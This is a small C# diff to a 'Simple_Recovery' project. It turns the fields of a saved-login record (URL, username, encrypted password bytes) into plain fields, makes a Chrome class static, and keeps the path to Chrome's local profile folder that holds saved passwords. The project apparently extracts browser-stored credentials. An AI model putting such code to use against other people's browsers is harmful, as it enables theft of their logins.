@@ -9,16 +9,16 @@ namespace Simple_Recovery.Modules
 {
     internal class User
     {
-        public string Action_url { get; set; }
+        public string Action_url;
 
-        public string Username_value { get; set; }
+        public string Username_value;
 
-        public byte[] Password_value { get; set; }
+        public byte[] Password_value;
     }
 
-    public class Chrome
+    public static class Chrome
     {
-        // Default file path for the database
+        // Default folder path for the database
 
         private static readonly string FolderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default";
 
